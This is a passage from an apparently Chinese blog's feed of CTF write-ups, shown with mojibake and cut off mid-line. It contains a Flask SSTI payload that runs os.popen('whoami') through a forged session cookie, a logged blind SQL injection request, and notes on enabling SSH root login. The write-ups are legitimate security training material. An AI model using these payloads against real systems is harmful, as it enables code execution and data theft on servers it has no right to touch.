class="comment">#è·å–å±å¹•çš„å°ºå¯¸</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(screenWidth,screenHeight)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x,y = pag.position() Â  <span class="comment">#è·å–å½“å‰é¼ æ ‡çš„ä½ç½®</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  posStr = <span class="string">&quot;Position:&quot;</span> + <span class="built_in">str</span>(x).rjust(<span class="number">4</span>)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(y).rjust(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(posStr)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  os.system(<span class="string">&#x27;cls&#x27;</span>) Â  <span class="comment">#æ¸…æ¥šå±å¹•</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">&#x27;end....&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">click_operation</span>():</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="string">&quot;&quot;&quot;ç‚¹å‡»æ“ä½œ&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># é¼ æ ‡éœ€è¦ç§»åŠ¨åˆ°çš„ä½ç½®</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x, y = <span class="number">1396</span>, <span class="number">850</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x1, y1 = <span class="number">182</span>,<span class="number">24</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x1, y1)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x2, y2 = <span class="number">120</span>,<span class="number">317</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x2, y2)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x3, y3 = <span class="number">115</span>,<span class="number">363</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x3, y3)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x11, y11=<span class="number">357</span>,<span class="number">22</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x11, y11)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x12, y12=<span class="number">97</span>,<span class="number">320</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x12, y12)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x13, y13=<span class="number">115</span>, <span class="number">508</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x13, y13)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  x14, y14=<span class="number">160</span>,<span class="number">560</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.moveTo(x14, y14)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  pyautogui.click()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">click_operation()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023longjianbeiwp</title>
      <link href="/2023/09/28/CTFS/2023%E6%B3%B7%E5%89%91%E6%9D%AFwp/"/>
      <url>/2023/09/28/CTFS/2023%E6%B3%B7%E5%89%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<p>æ²¡äº†<br>tcp.flags.syn==1 and tcp.flags.ack==1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;748007e861908c03&#x27;</span></span><br><span class="line"></span><br><span class="line">hex_string = <span class="string">&#x27;b5c1fadbb7e28da08572486d8e6933a84c5144463f178b352c5bda71cff4e8ffe919f0f115a528ebfc4a79b03aea0e31cb22d460ada998c7657d4d0f1be71ffa&#x27;</span></span><br><span class="line"></span><br><span class="line">byte_data = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">decrypted_data = cipher.decrypt(byte_data)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = zlib.decompress(decrypted_data,<span class="number">16</span> + zlib.MAX_WBITS)</span><br><span class="line"></span><br><span class="line">sa= <span class="built_in">str</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sa)</span><br></pre></td></tr></table></figure><p>ubuntu<br>sudoÂ viÂ /etc/ssh/sshd_config</p><p>æŠŠpermitrootlogin prohibit-passwordæ”¹æˆpermitrootlogin yes</p><p>tcp contains â€œusernameâ€ &amp;&amp; tcp contains â€œpasswdâ€</p><p>R-studio</p><p>stikynot.exe snt åç¼€</p><p>tcp contains â€œ{&quot;errcode&quot;:200}â€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python .\flask_session_cookie_manager3.py decode -s <span class="string">&quot;ssti_flask_hsfvaldb&quot;</span> -c <span class="string">&quot;.eJwdx1EKwyAMANCrDEGiPz1Ar1KGZBi7gBpplH2Idy_d-3vTDKWrYiGzm2k5vZRUWeo2WsRObkLKeMKeuekoB4RwZvlg1hDg_S917lSeOhAFf0CTRvXp7ytYGPx2EUbnl7drWqqRk11m3cGmKw0.YpIQcw.J5vs8t8bAr0xDIxF6EqUAH2kkLE&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;%if session.update(&#123;&#x27;flag&#x27;:lipsum[&#x27;__globals__&#x27;][&#x27;__getitem__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;)%&#125;&#123;%endif%&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python .\flask_session_cookie_manager3.py decode -s <span class="string">&quot;ssti_flask_hsfvaldb&quot;</span> -c <span class="string">&quot;.eJwdylsKAyEMQNGtFEGiUGYBs5VpkRQz04AvjNIPce-t_TyXO9QZ8FK7quQfSd1VF6oJI_3S0HzehEQ4p60Xj43MgPXDHrhIjwc4d4X8wiDOwfNPatwoLhrIAvaAkgulxc87Y2SwWyX0xk6r59CUPJ96qvkFHeUvmg.YpIQkg.65xf8l2g9fXAImkfyihId46KkY4&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;red\n&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;%if session.update(&#123;&#x27;flag&#x27;:lipsum[&#x27;__globals__&#x27;][&#x27;__getitem__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;)%&#125;&#123;%endif%&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022Space Heroes CTF</title>
      <link href="/2023/08/29/CTFS/2022Space-Heroes-CTF/"/>
      <url>/2023/08/29/CTFS/2022Space-Heroes-CTF/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="R2D2"><a href="#R2D2" class="headerlink" title="R2D2"></a>R2D2</h5><p>æç¤ºrobotæœºå™¨äººï¼Œç›´æ¥è®¿é—®robots.txtå³å¯</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403204930418.png" alt="image-20220403204930418"></p><h3 id="Space-Traveler"><a href="#Space-Traveler" class="headerlink" title="Space Traveler"></a>Space Traveler</h3><p>å‰ç«¯éªŒè¯ï¼Œç›´æ¥å³é”®æºä»£ç ï¼Œ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var _0xb645=[&quot;\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67&quot;,&quot;\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D&quot;,&quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E&quot;,&quot;\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D&quot;,&quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E&quot;,&quot;\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C&quot;,&quot;\x64\x65\x6D\x6F&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;];function myFunction()&#123;let _0xb729x2;let _0xb729x3=prompt(_0xb645[0],_0xb645[1]);switch(_0xb729x3)&#123;case _0xb645[3]:_0xb729x2= _0xb645[2];break;default:_0xb729x2= _0xb645[4]&#125;;document[_0xb645[7]](_0xb645[6])[_0xb645[5]]= _0xb729x2&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‡½æ•°æ‹¼æ¥  ä¸ç”¨ç®¡ï¼Œç›´æ¥æŠŠæ‰€æœ‰çš„16è¿›åˆ¶æå‡ºæ¥ï¼Œè§£ä¸€ä¸‹å°±å‡ºäº†.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C\x64\x65\x6D\x6F\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403205401207.png" alt="image-20220403205401207"></p><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h3 id="Khaaaaaan"><a href="#Khaaaaaan" class="headerlink" title="Khaaaaaan!"></a>Khaaaaaan!</h3><p>å¼€å±€ä¸€å¼ å›¾ï¼Œæ˜¯å››ç§å›¾å½¢ç¼–ç </p><p>åˆ†åˆ«å¯¹åº”çš„æ˜¯</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403205525043.png" alt="image-20220403205525043"></p><blockquote><p><a href="https://www.dcode.fr/symbols-ciphers">https://www.dcode.fr/symbols-ciphers</a><br>shctf{without_freedom_of_choice_there_is_no_creativity}</p></blockquote><h3 id="MobileInfantry"><a href="#MobileInfantry" class="headerlink" title="MobileInfantry"></a>MobileInfantry</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># def len_check(pad):</span></span><br><span class="line"><span class="comment">#     if len(pad) != 38:</span></span><br><span class="line"><span class="comment">#         return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 38ä½ï¼Œ</span></span><br><span class="line"><span class="comment"># def check1(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(0, int(len(pad)/2)+1):</span></span><br><span class="line"><span class="comment">#         if not pad[i].isupper():</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># isupper():å¤§å†™ï¼Œ1-20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def check2(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(int(len(pad)/2)+1, len(pad)):</span></span><br><span class="line"><span class="comment">#         if not pad[i].islower():</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># islower():å°å†™ï¼Œ21-38</span></span><br><span class="line"><span class="comment"># def check3(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(0, int(len(pad)/2)):</span></span><br><span class="line"><span class="comment">#         if ord(pad[i]) != ord(pad[i+1])-1:</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># 1-19  ABCDEFGHIJKLMNOPQRSTaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="comment"># zyxwvutsrqponmlkjihgfedcba</span></span><br><span class="line"><span class="comment"># zyxwvutsrqponmlkji</span></span><br><span class="line"><span class="comment"># def check4(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(int(len(pad)/2)+1, len(pad)-1):</span></span><br><span class="line"><span class="comment">#         if ord(pad[i]) != ord(pad[i+1])+1:</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTzyxwvutsrqponmlkji</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">strqian = <span class="string">&quot;ABCDEFGHIJKLMNOPQRST&quot;</span></span><br><span class="line">strhou = <span class="string">&quot;zyxwvutsrqponmlkji&quot;</span></span><br><span class="line">listqian = []</span><br><span class="line">listhou = []</span><br><span class="line"><span class="comment">#å¾ªç¯å‡ºæ‰€æœ‰å‰ç¼€listqian</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strqian:</span><br><span class="line">        s = s + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+j)</span><br><span class="line">        <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    listqian.append(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(listqian)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¾ªç¯å‡ºæ‰€æœ‰åç¼€listhou</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strhou:</span><br><span class="line">        s = s + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-j)</span><br><span class="line">        <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    listhou.append(s)</span><br><span class="line"><span class="comment">#print(listhou)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        sendstr = listqian[i]+listhou[j]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>,<span class="number">27602</span>)</span><br><span class="line">            io.sendline(sendstr)</span><br><span class="line">            a = io.recvall()</span><br><span class="line">            <span class="comment"># io.recvuntil(&quot;[+]&quot;,)</span></span><br><span class="line">            <span class="comment"># a = io.recvuntil(&quot;.&quot;,)</span></span><br><span class="line">            <span class="comment">#print(a.encode())</span></span><br><span class="line">            <span class="comment">#if &quot;&#123;&quot; in str(a) or &quot;&#125;&quot; in str(a):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(a):</span><br><span class="line">                <span class="built_in">print</span>(sendstr)</span><br><span class="line">                <span class="comment">#io.interactive()</span></span><br><span class="line">                <span class="built_in">print</span>(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> æ³·å‰‘æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfwebåˆ·é¢˜è®°å½•</title>
      <link href="/2023/06/14/ctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/06/14/ctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="é¹¤åŸæ¯-2021-æµé‡åˆ†æ"><a href="#é¹¤åŸæ¯-2021-æµé‡åˆ†æ" class="headerlink" title="[é¹¤åŸæ¯ 2021]æµé‡åˆ†æ"></a>[é¹¤åŸæ¯ 2021]æµé‡åˆ†æ</h4><p>å¼€å±€æ‹¿åˆ°ä¸€ä¸ªæµé‡åŒ…ï¼Œæ˜¯æµé‡åˆ†æï¼Œç»å…¸è€é¢˜ï¼Œ</p><p>ä¸€ä¸ªä¸€ä¸ªæ•°æ˜¾ç„¶å¤ªæ…¢äº†ï¼ŒæŠ„çš„è„šæœ¬ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strings timu.pcapng| grep flag &gt; a.txt</span></span><br><span class="line"><span class="comment">#åœ¨kaliä¸­ï¼Œå°†å¸¦æœ‰flagçš„å­—ç¬¦æå‡ºæ¥</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tjctf\\a.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="comment">#è¯»å–a.txt</span></span><br><span class="line">st = f.read().decode(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#GET /ctf/Less-5/?id=1&#x27;%20and%20ascii(substr((select%20flag%20from%20t),1,1))=33--+ HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">lis = re.findall(<span class="string">&quot;,([0-9]*),1\)\)=([0-9]*)&quot;</span>,st)</span><br><span class="line"><span class="comment">#è·å– ä½æ•°å’Œå­—ç¬¦æ•°</span></span><br><span class="line">aa = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="comment">#(&#x27;1&#x27;, &#x27;33&#x27;), (&#x27;1&#x27;, &#x27;34&#x27;), (&#x27;1&#x27;, &#x27;35&#x27;), (&#x27;1&#x27;, &#x27;36&#x27;), (&#x27;1&#x27;, &#x27;37&#x27;), </span></span><br><span class="line">    <span class="comment">#å°†æ•°å­—ä¸º1çš„ç´¢å¼•ä¸€ä¸ªä¸ªå¡«å……ï¼Œæ­£å¥½åˆ°æœ€åä¸€ä¸ªï¼Œæ¢ç´¢å¼•</span></span><br><span class="line">    aa[<span class="built_in">int</span>(t[<span class="number">0</span>])] = <span class="built_in">chr</span>(<span class="built_in">int</span>(t[<span class="number">1</span>]))</span><br><span class="line">    <span class="comment">#print(aa)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">sss  = [(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;33&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;34&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;35&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;36&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;37&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;38&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;39&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;40&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;41&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;42&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;43&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;44&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;45&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;46&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;47&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;48&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;49&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;50&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;51&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;52&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;53&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;54&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;55&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;56&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span 